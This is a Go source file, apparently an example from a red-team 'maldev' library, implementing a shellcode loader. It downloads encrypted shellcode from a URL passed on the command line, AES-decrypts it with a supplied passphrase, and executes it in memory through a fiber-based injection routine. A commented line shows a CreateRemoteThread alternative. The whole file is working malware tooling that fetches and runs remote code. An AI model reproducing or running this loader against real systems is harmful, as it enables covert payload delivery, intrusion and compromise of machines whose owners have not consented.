package main

import (
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	// Maldev packages
	"github.com/D3Ext/maldev/src/crypto"
	l "github.com/D3Ext/maldev/src/logging"
	"github.com/D3Ext/maldev/src/redteam"
)

func main() {
	if len(os.Args) <= 2 { // Check provided url
		fmt.Println("Shellcode URL missing! Example: loader http://192.168.116.146/shellcode.enc MySuperSecret32BitsLongPassword!")
		os.Exit(0)
	}

	l.ProgressBar("Retrieving encrypted shellcode from "+os.Args[1], 1500, 100)
	sc, err := redteam.GetShellcodeFromUrl(os.Args[1]) // Use maldev internal function to get shellcode from URL
	if err != nil {
		log.Fatal(err)
	}

	iv := sc[0:16] // Get IV from encrypted shellcode which is appended at the beginning
	sc = sc[16:]   // Now remove the first 16 bytes from shellcode which are the IV

	l.Success("Encrypted shellcode retrieved successfully: ")
	fmt.Println(sc)
	time.Sleep(400 * time.Millisecond)
	l.Info("Decrypting shellcode using provided PSK: " + strings.Repeat("*", len(os.Args[2])))

	sc, err = crypto.AESDecrypt(sc, iv, []byte(os.Args[2])) // Use maldev internal function to decrypt shellcode
	if err != nil {
		log.Fatal(err)
	}
	time.Sleep(300 * time.Millisecond)

	l.Success("Shellcode has been decrypted successfully!") // Some progress bars to let the user read
	l.ProgressBar("Trying to inject shellcode", 1500, 100)

	//err = shellcode.CreateRemoteThread(sc) // Inject shellcode
	err = redteam.Fibers(sc)
	if err != nil {
		log.Fatal(err)
	}

	l.Success("Shellcode should have been executed!")
	time.Sleep(100 * time.Millisecond)
}
